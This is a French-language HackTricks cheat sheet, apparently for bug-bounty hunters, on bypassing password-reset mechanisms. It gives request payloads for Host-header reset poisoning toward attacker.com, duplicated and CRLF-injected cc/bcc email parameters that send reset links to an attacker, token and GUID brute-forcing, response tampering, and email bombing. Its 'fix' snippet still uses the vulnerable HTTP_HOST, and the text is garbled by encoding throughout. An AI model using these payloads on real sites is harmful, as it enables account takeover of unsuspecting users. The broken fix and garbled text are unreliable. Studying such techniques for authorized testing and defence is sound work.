# Contournement de r√©initialisation/mot de passe oubli√©

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes de bugs !

**Aper√ßus de Piratage**\
Engagez-vous avec du contenu qui plonge dans le frisson et les d√©fis du piratage

**Nouvelles de Piratage en Temps R√©el**\
Restez √† jour avec le monde du piratage rapide gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el

**Derni√®res Annonces**\
Restez inform√© avec les derni√®res primes de bugs lanc√©es et les mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

La compilation des techniques suivantes a √©t√© prise de [https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)

## Fuite de Token de R√©initialisation de Mot de Passe Via R√©f√©rent

Le **HTTP referer** est un champ d'en-t√™te HTTP optionnel qui identifie l'adresse de la page web qui est li√©e √† la ressource demand√©e. L'en-t√™te de requ√™te Referer contient l'adresse de la page web pr√©c√©dente √† partir de laquelle un lien vers la page actuellement demand√©e a √©t√© suivi.

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### Exploitation

* Demandez la r√©initialisation du mot de passe √† votre adresse e-mail
* Cliquez sur le lien de r√©initialisation du mot de passe
* Ne changez pas le mot de passe
* Cliquez sur des sites web tiers (par exemple : Facebook, Twitter)
* Interceptez la requ√™te dans le proxy Burpsuite
* V√©rifiez si l'en-t√™te referer fuite le token de r√©initialisation du mot de passe.

### Impact

Cela permet √† la personne qui a le contr√¥le d'un site particulier de changer le mot de passe de l'utilisateur (attaque CSRF), car cette personne conna√Æt le token de r√©initialisation du mot de passe de l'utilisateur.

### R√©f√©rence :

* https://hackerone.com/reports/342693
* https://hackerone.com/reports/272379
* https://hackerone.com/reports/737042
* https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a
* https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1

## Empoisonnement de R√©initialisation de Mot de Passe

Si vous trouvez une attaque de l'en-t√™te d'h√¥te et qu'elle est hors de port√©e, essayez de trouver le bouton de r√©initialisation du mot de passe !

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### Exploitation

* Interceptez la demande de r√©initialisation du mot de passe dans Burpsuite
* Ajoutez l'en-t√™te suivant ou modifiez l'en-t√™te dans Burpsuite (essayez un par un)
```
Host: attacker.com
```

```
Host: target.com
X-Forwarded-Host: attacker.com
```

```
Host: target.com
Host: attacker.com
```
* V√©rifiez si le lien pour changer le mot de passe dans l'email pointe vers attacker.com

### Correctif

Utilisez `$_SERVER['SERVER_NAME']` plut√¥t que `$_SERVER['HTTP_HOST']`
```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```
### Impact

La victime recevra le lien malveillant dans son email et, en cliquant dessus, divulguera le lien / jeton de r√©initialisation du mot de passe de l'utilisateur √† l'attaquant, menant √† la prise de contr√¥le compl√®te du compte.

### R√©f√©rence :

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## R√©initialisation du mot de passe en manipulant le param√®tre Email

### Exploitation

* Ajouter l'email de l'attaquant comme second param√®tre en utilisant &
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* Ajouter l'email de l'attaquant comme second param√®tre en utilisant %20
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* Ajouter l'email de l'attaquant comme second param√®tre en utilisant |
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
* Ajouter l'email de l'attaquant comme second param√®tre en utilisant cc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* Ajouter l'email de l'attaquant comme second param√®tre en utilisant bcc
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* Ajoutez l'email de l'attaquant comme second param√®tre en utilisant ,
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* Ajouter l'email de l'attaquant comme second param√®tre dans le tableau json
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
### R√©f√©rence

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## Changement de l'Email et du Mot de passe de n'importe quel Utilisateur via les Param√®tres de l'API

### Exploitation

* L'attaquant doit se connecter avec son compte et aller √† la fonction de changement de mot de passe
* D√©marrer Burp Suite et intercepter la requ√™te
* Apr√®s avoir intercept√© la requ√™te, l'envoyer au r√©p√©teur et modifier les param√®tres Email et Mot de passe
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
### R√©f√©rence

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### Pas de limitation de taux : Bombardement d'emails <a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### Exploitation

* Lancez Burp Suite et interceptez la demande de r√©initialisation de mot de passe
* Envoyez √† l'intrus
* Utilisez une charge utile nulle

### R√©f√©rence

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## D√©couvrez comment le jeton de r√©initialisation de mot de passe est g√©n√©r√©

D√©couvrez le mod√®le du jeton de r√©initialisation de mot de passe

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

Si c'est

* G√©n√©r√© sur la base du Timestamp
* G√©n√©r√© sur la base de l'UserID
* G√©n√©r√© sur la base de l'email de l'utilisateur
* G√©n√©r√© sur la base du Pr√©nom et du Nom
* G√©n√©r√© sur la base de la Date de Naissance
* G√©n√©r√© sur la base de la Cryptographie

Utilisez Burp Sequencer pour trouver l'al√©atoire ou la pr√©visibilit√© des jetons.

## GUID devinable

Il existe diff√©rents types de GUID :

* **Version 0 :** Seulement vu dans le GUID nul ("00000000-0000-0000-0000-000000000000").
* **Version 1 :** Le GUID est g√©n√©r√© de mani√®re pr√©visible sur la base de :
* L'heure actuelle
* Une "s√©quence d'horloge" g√©n√©r√©e al√©atoirement qui reste constante entre les GUID pendant le temps de fonctionnement du syst√®me g√©n√©rant
* Un "ID de n≈ìud", qui est g√©n√©r√© sur la base de l'adresse MAC du syst√®me s'il est disponible
* **Version 3 :** Le GUID est g√©n√©r√© en utilisant un hachage MD5 d'un nom et d'un espace de noms fournis.
* **Version 4 :** Le GUID est g√©n√©r√© al√©atoirement.
* **Version 5 :** Le GUID est g√©n√©r√© en utilisant un hachage SHA1 d'un nom et d'un espace de noms fournis.

Il est possible de regarder un GUID et de d√©couvrir sa version, il existe un petit outil pour cela : [**guidtool**](https://github.com/intruder-io/guidtool)****
```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```
Si la version utilis√©e pour g√©n√©rer un GUID de r√©initialisation de mot de passe est la version 1, il est possible de forcer brutalement les GUID :
```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```
### R√©f√©rences

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## Manipulation de r√©ponse : Remplacer une mauvaise r√©ponse par une bonne

Cherchez des requ√™tes et des r√©ponses comme celles-ci
```php
HTTP/1.1 401 Unauthorized
(‚Äúmessage‚Äù:‚Äùunsuccessful‚Äù,‚ÄùstatusCode:403,‚ÄùerrorDescription‚Äù:‚ÄùUnsuccessful‚Äù)
```
Changer la r√©ponse
```php
HTTP/1.1 200 OK
(‚Äúmessage‚Äù:‚Äùsuccess‚Äù,‚ÄùstatusCode:200,‚ÄùerrorDescription‚Äù:‚ÄùSuccess‚Äù)
```
### R√©f√©rence

* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### Utilisation d'un jeton expir√© <a href="#8-using-expired-token" id="8-using-expired-token"></a>

* V√©rifiez si le jeton expir√© peut √™tre r√©utilis√©

### Forcer le jeton de r√©initialisation du mot de passe <a href="#9-brute-force-password-rest-token" id="9-brute-force-password-rest-token"></a>

Essayez de forcer le jeton de r√©initialisation en utilisant Burpsuite
```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
### R√©f√©rence

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### Essayez d'utiliser votre jeton <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* Essayez d'ajouter votre jeton de r√©initialisation de mot de passe avec le compte de la victime
```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### R√©f√©rence

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## Invalid**ation de session** lors de la D√©connexion/R√©initialisation de mot de passe

Lorsqu'un utilisateur se **d√©connecte ou r√©initialise son mot de passe**, la session actuelle doit √™tre invalid√©e.\
Ainsi, **capturez les cookies** pendant que l'utilisateur est connect√©, **d√©connectez-vous**, et **v√©rifiez** si les **cookies** sont toujours **valides**.\
R√©p√©tez le processus en **changeant le mot de passe** au lieu de vous d√©connecter.

## Temps d'expiration du Token de r√©initialisation

Les **tokens de r√©initialisation doivent avoir un temps d'expiration**, apr√®s cela le token ne devrait plus √™tre valide pour changer le mot de passe d'un utilisateur.

## V√©rifications suppl√©mentaires

* Utilisez username@burp\_collab.net et analysez le callback
* Email en copie carbone email=victim@mail.com%0a%0dcc:hacker@mail.com
* Mot de passe long (>200) entra√Æne un DoS
* Ajoutez un second param√®tre email et sa valeur

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Rejoignez le serveur [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) pour communiquer avec des hackers exp√©riment√©s et des chasseurs de primes de bugs !

**Aper√ßus de Hacking**\
Engagez-vous avec du contenu qui plonge dans l'excitation et les d√©fis du hacking

**Nouvelles de Hacking en Temps R√©el**\
Restez √† jour avec le monde du hacking rapide gr√¢ce √† des nouvelles et des aper√ßus en temps r√©el

**Derni√®res Annonces**\
Restez inform√© avec les derni√®res primes de bugs lanc√©es et les mises √† jour cruciales de la plateforme

**Rejoignez-nous sur** [**Discord**](https://discord.com/invite/N3FrSbmwdy) et commencez √† collaborer avec les meilleurs hackers d√®s aujourd'hui !

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous voulez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
